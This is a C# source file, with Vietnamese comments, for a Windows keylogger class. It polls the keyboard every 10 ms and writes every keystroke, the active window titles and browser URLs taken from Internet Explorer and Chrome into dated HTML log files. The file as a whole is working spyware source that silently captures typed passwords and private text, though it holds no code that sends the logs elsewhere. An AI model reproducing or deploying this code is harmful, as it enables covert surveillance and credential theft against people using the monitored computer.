using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Collections;
using System.Diagnostics;
using System.Windows.Automation;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
namespace Windows_Security_Application
{
    class KeyLogger
    {
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // điều tra trạng thái phím bấm
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);// lấy tiêu đề của cửa sổ
        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();

        private System.String keyBuffer;   // chuỗi lưu các phím bấm 
        private System.Timers.Timer timerKeyMine;  // timer cập nhật liên tục cho keyBuffer (10 ms)
        private System.Timers.Timer timerBufferFlush; // timer ghi chuỗi keyBuffer ra file log .html sau khoảng thời gian nhất định
        private System.String hWndTitle; // chuỗi lưu tiêu đề của cửa sổ window đang làm việc
        private System.String hWndTitlePast; //chuỗi lưu tiêu đề của cửa sổ window làm việc trước đó
        public System.String LOG_FILE;  // lưu đường dẫn + tên logfile (chưa có đuôi html)
        public System.String LOG_MODE;
        public System.String LOG_OUT;
        public string strLogFileName { get; set; } //đường dẫn đầy đủ của logfile
        public string strLogDirPath { get; set; }  // lưu đường dẫn tới thu mục log
        public KeyLogger()
        {
            hWndTitle = ActiveApplTitle();
            hWndTitlePast = hWndTitle;
            // Writes a header for the HTML file
            // writeHTMLHeader();
            //
            // keyBuffer
            //
            keyBuffer = "";
            // 
            // timerKeyMine
            // 
            this.timerKeyMine = new System.Timers.Timer();
            this.timerKeyMine.Enabled = true;
            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            this.timerKeyMine.Interval = 10;

            // 
            // timerBufferFlush
            //
            this.timerBufferFlush = new System.Timers.Timer();
            this.timerBufferFlush.Enabled = true;
            this.timerBufferFlush.Interval = 1800000; // 30 minutes
        }

        /// <summary>
        /// Hàm lấy tiêu đề của cửa sổ window đang làm việc
        /// </summary>
        /// <returns></returns>
		public static string ActiveApplTitle()
        {
            int hwnd = GetForegroundWindow();
            StringBuilder sbTitle = new StringBuilder(1024);
            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
            if ((intLength <= 0) || (intLength > sbTitle.Length)) return "unknown";
            string title = sbTitle.ToString();
            return title;
        }
        /// <summary>
        /// Timer ghi lại phím bấm,tiêu đề và địa chỉ trang web đang truy cập
        /// vào  chuỗi keyBuffer
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
		private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            string file = LOG_FILE;
            Boolean writeHeader = false;
            #region Ghi lại những phím đã bấm từ bàn phím
            try
            {
                file += "_" + DateTime.Now.ToString("dd.MM.yyyy") + ".html";
                if (File.Exists(file) == false) //nếu chưa tồn tại file
                {
                    writeHeader = true;

                }
            }
            catch (Exception ex)
            {
                // Uncomment this to help debug.
                // Console.WriteLine(ex.Message);
                //MessageBox.Show(ex.ToString());

            }
            if (HookKeyboard == true)
            {
                foreach (System.Int32 i in Enum.GetValues(typeof(System.Windows.Forms.Keys)))
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {

                        //=====================================
                        try
                        {
                            using (var fil = new FileStream(file, FileMode.Append, FileAccess.Write, FileShare.Write))
                            {
                                using (var sw = new StreamWriter(fil))
                                {
                                    #region tao head file
                                    if (writeHeader == true)
                                    { //nếu file chưa tồn tại thì viết HTMLHeader
                                      //  writeHTMLHeader();
                                        sw.Write("<html><head><title>Log file</title><font name=\"Arial\" size=\"4\">" + "KeyLog_" + DateTime.Now.ToString("dd.MM.yyyy") + "</font><meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\"></head>");
                                        // sau đó viết body của file HTML
                                        sw.Write("<html><body><br><font name=\"Arial\" size=\"3\">");
                                        sw.Write(keyBuffer);

                                    }
                                    else
                                    {
                                        sw.Write("<html><body><font name=\"Arial\" size=\"3\">");
                                        sw.Write(keyBuffer);
                                    }
                                    #endregion
                                    string title = "";
                                    hWndTitle = ActiveApplTitle();
                                    //MessageBox.Show(hWndTitle + "\n" + hWndTitlePast);
                                    if (hWndTitle != hWndTitlePast || hWndTitlePast == null)
                                    {
                                        //MessageBox.Show(hWndTitle + "\n" + hWndTitlePast);
                                        sw.Write("<br>Windows: " + hWndTitle + "<br>");
                                        #region Nếu vào internet thì lấy tiêu đề và địa chỉ trang web của IE,FireFox,Chrome
                                        foreach (Process process in Process.GetProcessesByName("firefox"))
                                        {
                                            // lấy địa chỉ URL của trình duyệt FireFox
                                            // string url = GetFirefoxUrl(process);
                                            //string url = GetBrowserURL("firefox");

                                            if (process.MainWindowTitle.ToString() != hWndTitle)
                                            {
                                                sw.Write("<br><b><i>" + process.MainWindowTitle.ToString() + "</i></b><br>\n");
                                                title = process.MainWindowTitle.ToString();
                                            }
                                        }
                                        foreach (Process process in Process.GetProcessesByName("opera"))
                                        {
                                            // lấy địa chỉ URL của trình duyệt Opera
                                            //string url = GetBrowserURL("opera");
                                            if (process.MainWindowTitle.ToString() != hWndTitle)
                                            {
                                                sw.Write("<br><b><i>" + process.MainWindowTitle.ToString() + "</i></b><br>\n");
                                                //sw.Write("URL: " + url + "<br>");
                                                title = process.MainWindowTitle.ToString();
                                            }
                                        }
                                        foreach (Process process in Process.GetProcessesByName("iexplore"))
                                        {
                                            // lấy địa chỉ URL của trình duyệt Internet Explorer
                                            string url = GetInternetExplorerUrl(process);
                                            if (url != null && process.MainWindowTitle.ToString() != hWndTitle)
                                            {
                                                sw.Write("<br><b><i>" + process.MainWindowTitle.ToString() + "</i></b><br>\n");
                                                sw.Write("URL: " + url + "<br>");
                                                title = process.MainWindowTitle.ToString();

                                            }
                                        }
                                        foreach (Process process in Process.GetProcessesByName("chrome.exe"))
                                        {

                                            // lấy địa chỉ URL của trình duyệt Chrome
                                            string url = GetChromeUrl(process);
                                            if (url != null && process.MainWindowTitle.ToString() != hWndTitle)
                                            {
                                                sw.Write("<br><b><i>" + process.MainWindowTitle.ToString() + "</i></b><br>\n");
                                                sw.Write("URL: " + url + "<br>");
                                                title = process.MainWindowTitle.ToString();
                                            }
                                        }
                                        #endregion
                                        #region Lấy đường dẫn tới cửa sổ window đang sử dụng
                                        if (hWndTitle != title)
                                        {
                                            // nếu không phải là trình duyệt web thì lấy đường dẫn tới thư mục của cửa sổ
                                            //   StringBuilder sb = new StringBuilder();
                                            //    SHDocVw.ShellWindows shellWindow = new SHDocVw.ShellWindowsClass();
                                            //    string filename;
                                            //    foreach (SHDocVw.InternetExplorer ie in shellWindow)
                                            //    {
                                            //        filename = Path.GetFileNameWithoutExtension(ie.FullName).ToLower();
                                            //        if (filename.Equals("explorer"))
                                            //        {
                                            //            sw.Write("<br><b><i>" + ie.LocationName + "</i></b><br>\n");
                                            //            sw.Write(ie.LocationURL.ToString() + "<br>");
                                            //        }
                                            //    }
                                        }
                                        #endregion
                                        hWndTitlePast = hWndTitle;
                                    }
                                    if (ControlKey)
                                    {
                                        sw.Write("<font color=\"008005\">[Ctrl]</font>");
                                    }

                                    if (AltKey)
                                    {

                                        sw.Write("<font color=\"008005\">[Alt]</font>");
                                    }

                                    // ghi ra file HTML có tô màu font 
                                    //if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "LButton")
                                    //  sw.Write("<font color=\"008000\">[LMouse]</font>");
                                    //else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "RButton")
                                    //sw.Write("<font color=\"008000\">[RMouse]</font>");
                                    // else 

                                    if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "Back")
                                        sw.Write("<font color=\"008000\">[Backspace]</font>");

                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "Space")
                                        sw.Write("<font color=\"008000\">[Space]</font>");
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "Enter")
                                        sw.Write("<font color=\"008000\">[Enter]</font> <br>");

                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "ControlKey")
                                        continue;
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "LControlKey")
                                        continue;
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "RControlKey")
                                        continue;
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "LControlKey")
                                        continue;
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "ShiftKey")
                                        continue;
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "LShiftKey")
                                        continue;
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "RShiftKey")
                                        continue;

                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "Delete")
                                        sw.Write("<font color=\"008000\">[Del]</font>");
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "Insert")
                                        sw.Write("<font color=\"008000\">[Ins]</font>");
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "Home")
                                        sw.Write("<font color=\"008000\">[Home]</font>");
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "End")
                                        sw.Write("<font color=\"008000\">[End]</font>");
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "Tab")
                                        sw.Write("<font color=\"008000\">[Tab]</font>");
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "Prior")
                                        sw.Write("<font color=\"008000\">[Page Up]</font>");
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "PageDown")
                                        sw.Write("<font color=\"008000\">[Page Down]</font>");
                                    else if (Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "LWin" || Enum.GetName(typeof(System.Windows.Forms.Keys), i) == "RWin")
                                        sw.Write("<font color=\"008000\">[Win]</font>");
                                    else if (i.ToString() == "27")
                                        sw.Write("<font color=\"008000\">[Escape]</font>");
                                    else if (i.ToString() == "44")
                                        sw.Write("<font color=\"008000\">[PrintScreeen]</font>");
                                    else if (i.ToString() == "93")
                                        sw.Write("<font color=\"008000\">[Apps]</font>");

                                    //các phím chức năng F1->F12
                                    else if (i.ToString() == "112")
                                        sw.Write("<font color=\"008000\">[F1]</font>");
                                    else if (i.ToString() == "113")
                                        sw.Write("<font color=\"008000\">[F2]</font>");
                                    else if (i.ToString() == "114")
                                        sw.Write("<font color=\"008000\">[F3]</font>");
                                    else if (i.ToString() == "115")
                                        sw.Write("<font color=\"008000\">[F4]</font>");
                                    else if (i.ToString() == "116")
                                        sw.Write("<font color=\"008000\">[F5]</font>");
                                    else if (i.ToString() == "117")
                                        sw.Write("<font color=\"008000\">[F6]</font>");
                                    else if (i.ToString() == "118")
                                        sw.Write("<font color=\"008000\">[F7]</font>");
                                    else if (i.ToString() == "119")
                                        sw.Write("<font color=\"008000\">[F8]</font>");
                                    else if (i.ToString() == "120")
                                        sw.Write("<font color=\"008000\">[F9]</font>");
                                    else if (i.ToString() == "121")
                                        sw.Write("<font color=\"008000\">[F10]</font>");
                                    else if (i.ToString() == "122")
                                        sw.Write("<font color=\"008000\">[F11]</font>");
                                    else if (i.ToString() == "123")
                                        sw.Write("<font color=\"008000\">[F12]</font>");

                                    // các phím mũi tên
                                    else if (i.ToString() == "37")
                                        sw.Write("<font color=\"008005\">[Left]</font>");
                                    else if (i.ToString() == "38")
                                        sw.Write("<font color=\"008005\">[Up]</font>");
                                    else if (i.ToString() == "39")
                                        sw.Write("<font color=\"008005\">[Right]</font>");
                                    else if (i.ToString() == "40")
                                        sw.Write("<font color=\"008005\">[Down]</font>");
                                    #region Numlock
                                    /* ********************************************** *
                                     * Phát hiện các phím khi bật phím NumLock
                                     * ********************************************** */
                                    /*
                                   if (NumLock)
                                   {
                                       // sw.Write("<font color=\"008005\">[NumLock=On]</font>");
                                       if (i.ToString() == "96")
                                           sw.Write("<font color=\"008005\">[NumPad0]</font>");
                                       else if (i.ToString() == "97")
                                           sw.Write("<font color=\"008005\">[NumPad1]</font>");
                                       else if (i.ToString() == "98")
                                           sw.Write("<font color=\"008005\">[NumPad2]</font>");
                                       else if (i.ToString() == "99")
                                           sw.Write("<font color=\"008005\">[NumPad3]</font>");
                                       else if (i.ToString() == "100")
                                           sw.Write("<font color=\"008005\">[NumPad4]</font>");
                                       else if (i.ToString() == "101")
                                           sw.Write("<font color=\"008005\">[NumPad5]</font>");
                                       else if (i.ToString() == "102")
                                           sw.Write("<font color=\"008005\">[NumPad6]</font>");
                                       else if (i.ToString() == "103")
                                           sw.Write("<font color=\"008005\">[NumPad7]</font>");
                                       else if (i.ToString() == "104")
                                           sw.Write("<font color=\"008005\">[NumPad8]</font>");
                                       else if (i.ToString() == "105")
                                           sw.Write("<font color=\"008005\">[NumPad9]</font>");
                                       else if (i.ToString() == "106")
                                           sw.Write("<font color=\"008005\">[Multiply]</font>");
                                       else if (i.ToString() == "107")
                                           sw.Write("<font color=\"008005\">[Add]</font>");
                                       else if (i.ToString() == "109")
                                           sw.Write("<font color=\"008005\">[Subbtract]</font>");
                                       else if (i.ToString() == "110")
                                           sw.Write("<font color=\"008005\">[Decimal]</font>");

                                   }
                                   */
                                    #endregion
                                    switch (i)
                                    {
                                        case 0x30: sw.Write((ShiftKey ? ")" : "0")); break;
                                        case 0x31: sw.Write((ShiftKey ? "!" : "1")); break;
                                        case 0x32: sw.Write((ShiftKey ? "@" : "2")); break;
                                        case 0x33: sw.Write((ShiftKey ? "#" : "3")); break;
                                        case 0x34: sw.Write((ShiftKey ? "$" : "4")); break;
                                        case 0x35: sw.Write((ShiftKey ? "%" : "5")); break;
                                        case 0x36: sw.Write((ShiftKey ? "^" : "6")); break;
                                        case 0x37: sw.Write((ShiftKey ? "&" : "7")); break;
                                        case 0x38: sw.Write((ShiftKey ? "*" : "8")); break;
                                        case 0x39: sw.Write((ShiftKey ? "(" : "9")); break;

                                        case 0x41: sw.Write((CapsLock ? (ShiftKey ? "a" : "A") : (ShiftKey ? "A" : "a"))); break;
                                        case 0x42: sw.Write((CapsLock ? (ShiftKey ? "b" : "B") : (ShiftKey ? "B" : "b"))); break;
                                        case 0x43: sw.Write((CapsLock ? (ShiftKey ? "c" : "C") : (ShiftKey ? "C" : "c"))); break;
                                        case 0x44: sw.Write((CapsLock ? (ShiftKey ? "d" : "D") : (ShiftKey ? "D" : "d"))); break;
                                        case 0x45: sw.Write((CapsLock ? (ShiftKey ? "e" : "E") : (ShiftKey ? "E" : "e"))); break;
                                        case 0x46: sw.Write((CapsLock ? (ShiftKey ? "f" : "F") : (ShiftKey ? "F" : "f"))); break;
                                        case 0x47: sw.Write((CapsLock ? (ShiftKey ? "g" : "G") : (ShiftKey ? "G" : "g"))); break;
                                        case 0x48: sw.Write((CapsLock ? (ShiftKey ? "h" : "H") : (ShiftKey ? "H" : "h"))); break;
                                        case 0x49: sw.Write((CapsLock ? (ShiftKey ? "i" : "I") : (ShiftKey ? "I" : "i"))); break;
                                        case 0x4A: sw.Write((CapsLock ? (ShiftKey ? "j" : "J") : (ShiftKey ? "J" : "j"))); break;
                                        case 0x4B: sw.Write((CapsLock ? (ShiftKey ? "k" : "K") : (ShiftKey ? "K" : "k"))); break;
                                        case 0x4C: sw.Write((CapsLock ? (ShiftKey ? "l" : "L") : (ShiftKey ? "L" : "l"))); break;
                                        case 0x4D: sw.Write((CapsLock ? (ShiftKey ? "m" : "M") : (ShiftKey ? "M" : "m"))); break;
                                        case 0x4E: sw.Write((CapsLock ? (ShiftKey ? "n" : "N") : (ShiftKey ? "N" : "n"))); break;
                                        case 0x4F: sw.Write((CapsLock ? (ShiftKey ? "o" : "O") : (ShiftKey ? "O" : "o"))); break;
                                        case 0x50: sw.Write((CapsLock ? (ShiftKey ? "p" : "P") : (ShiftKey ? "P" : "p"))); break;
                                        case 0x51: sw.Write((CapsLock ? (ShiftKey ? "q" : "Q") : (ShiftKey ? "Q" : "q"))); break;
                                        case 0x52: sw.Write((CapsLock ? (ShiftKey ? "r" : "R") : (ShiftKey ? "R" : "r"))); break;
                                        case 0x53: sw.Write((CapsLock ? (ShiftKey ? "s" : "S") : (ShiftKey ? "S" : "s"))); break;
                                        case 0x54: sw.Write((CapsLock ? (ShiftKey ? "t" : "T") : (ShiftKey ? "T" : "t"))); break;
                                        case 0x55: sw.Write((CapsLock ? (ShiftKey ? "u" : "U") : (ShiftKey ? "U" : "u"))); break;
                                        case 0x56: sw.Write((CapsLock ? (ShiftKey ? "v" : "V") : (ShiftKey ? "V" : "v"))); break;
                                        case 0x57: sw.Write((CapsLock ? (ShiftKey ? "w" : "W") : (ShiftKey ? "W" : "w"))); break;
                                        case 0x58: sw.Write((CapsLock ? (ShiftKey ? "x" : "X") : (ShiftKey ? "X" : "x"))); break;
                                        case 0x59: sw.Write((CapsLock ? (ShiftKey ? "y" : "Y") : (ShiftKey ? "Y" : "y"))); break;
                                        case 0x5A: sw.Write((CapsLock ? (ShiftKey ? "z" : "Z") : (ShiftKey ? "Z" : "z"))); break;

                                        case 0x60: sw.Write(("0")); break;
                                        case 0x61: sw.Write(("1")); break;
                                        case 0x62: sw.Write(("2")); break;
                                        case 0x63: sw.Write(("3")); break;
                                        case 0x64: sw.Write(("4")); break;
                                        case 0x65: sw.Write(("5")); break;
                                        case 0x66: sw.Write(("6")); break;
                                        case 0x67: sw.Write(("7")); break;
                                        case 0x68: sw.Write(("8")); break;
                                        case 0x69: sw.Write(("9")); break;

                                    }
                                }
                                fil.Close();
                                fil.Dispose();
                            }
                            strLogFileName = file;  //đường dẫn đầy đủ của logfile
                        }
                        catch
                        {

                        }
                    }              

                }
            }
        }
        
    #endregion
    #region toggles trang thai phim
    public static bool ControlKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(System.Windows.Forms.Keys.ControlKey) & 0x8000); }
        } // ControlKey
        public static bool ShiftKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey) & 0x8000); }
        } // ShiftKey
        public static bool CapsLock
        {
            get { return Control.IsKeyLocked(Keys.CapsLock); }
        
        } // CapsLock
        public static bool AltKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(System.Windows.Forms.Keys.Menu) & 0x8000); }
        } // AltKey
        public static bool NumLock
        {
            get { return Control.IsKeyLocked(Keys.NumLock); }
        } // Numlock
        #endregion
        // HTML header that runs only once

        #region Properties
        public System.Boolean Enabled
        {
            get
            {
                return timerKeyMine.Enabled && timerBufferFlush.Enabled;
            }
            set
            {
                timerKeyMine.Enabled = timerBufferFlush.Enabled = value;
            }
        }
        public Boolean HookKeyboard { get; set; }
        public System.Double FlushInterval
        {
            get
            {
                return timerBufferFlush.Interval;
            }
            set
            {
                timerBufferFlush.Interval = value;
            }
        }

        public System.Double MineInterval
        {
            get
            {
                return timerKeyMine.Interval;
            }
            set
            {
                timerKeyMine.Interval = value;
            }
        }
        #endregion


        #region GetCurrentURL
        // // usage: GetBrowserURL("opera") or GetBrowserURL("firefox") // 
        //private string GetBrowserURL(string browser)
        //{
        //    try
        //    {
        //        DdeClient dde = new DdeClient(browser, "WWW_GetWindowInfo");
        //        dde.Connect();
        //        string url = dde.Request("URL", int.MaxValue);
        //        string[] text = url.Split(new string[] { "\",\"" }, StringSplitOptions.RemoveEmptyEntries);
        //        dde.Disconnect();
        //        return text[0].Substring(1);
        //    }
        //    catch
        //    {
        //        return null;
        //    }
        //}
        public static string GetChromeUrl(Process process)
        {
            if (process == null)
                throw new ArgumentNullException("process");
            if (process.MainWindowHandle == IntPtr.Zero)
                return null;
                AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
                if (element == null)
                    return null;
                AutomationElement edit = element.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit));
                if (edit != null)
                    return ((ValuePattern)edit.GetCurrentPattern(ValuePattern.Pattern)).Current.Value as string;
                else return null;
            
        }
        public static string GetInternetExplorerUrl(Process process)
        {
            if (process == null)
                throw new ArgumentNullException("process");
            if (process.MainWindowHandle == IntPtr.Zero)
                return null;
            AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
            if (element == null)
                return null;
            AutomationElement rebar = element.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.ClassNameProperty, "ReBarWindow32"));
            if (rebar == null)
                return null;
            AutomationElement edit = rebar.FindFirst(TreeScope.Subtree, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit));
            return ((ValuePattern)edit.GetCurrentPattern(ValuePattern.Pattern)).Current.Value as string;
        }
        public static string GetFirefoxUrl(Process process)
        {
            if (process == null)
                throw new ArgumentNullException("process");
            if (process.MainWindowHandle == IntPtr.Zero)
                return null;
            AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
            if (element == null)
                return null;
            AutomationElement doc = element.FindFirst(TreeScope.Subtree, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Document));
            if (doc == null)
                return null;
            return ((ValuePattern)doc.GetCurrentPattern(ValuePattern.Pattern)).Current.Value as string;
        }
        #endregion
    }
}
